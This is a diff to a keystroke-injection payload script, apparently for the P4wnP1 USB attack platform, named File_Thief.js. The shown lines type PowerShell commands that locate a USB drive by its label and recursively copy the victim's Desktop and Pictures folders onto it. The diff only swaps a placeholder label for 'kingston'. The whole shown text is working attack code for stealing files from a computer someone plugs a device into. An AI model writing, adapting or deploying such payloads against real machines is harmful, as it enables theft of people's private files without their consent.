+++ payloads/p4wnp1/File_Thief.js
@@ -7,7 +7,7 @@ delay(150);
 type("powershell\n");
 delay(150);
  
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'DRIVE NAME' } | select name\n");
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'kingston' } | select name\n");
 
 type("copy-item $env:userprofile/Desktop -destination $usbpath.name -recurse\n");
 type("copy-item $env:userprofile/Pictures -destination $usbpath.name -recurse\n");